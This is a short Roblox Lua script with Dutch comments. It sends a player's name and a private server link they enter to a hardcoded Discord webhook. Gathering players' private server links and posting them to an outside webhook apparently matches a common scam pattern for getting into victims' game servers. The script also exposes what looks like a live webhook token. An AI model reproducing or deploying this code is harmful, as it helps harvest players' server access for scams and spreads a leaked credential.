local HttpService = game:GetService("HttpService")
local webhookURL = "https://discord.com/api/webhooks/1428258203107594330/lRV6nJyJTHjdRQ34NwceDgr4A863H4rspsx1Tf12L21bSRjNpHg6ZPLwaJAdwX95-h1a"

function sendToDiscord(privateServerLink, playerName)
    local data = {
        ["content"] = "Nieuwe private server link van " .. playerName .. ": " .. privateServerLink
    }
    local jsonData = HttpService:JSONEncode(data)
    HttpService:PostAsync(webhookURL, jsonData)
end

-- Voorbeeld: wanneer iemand de link invult
-- Zet deze functie-aanroep op de plek waar de gebruiker de link invoert!
local playerName = game.Players.LocalPlayer.Name
local privateServerLink = "VUL_HIER_DE_PRIVÉ_SERVER_LINK_IN" -- Vervang dit met de user input

sendToDiscord(privateServerLink, playerName)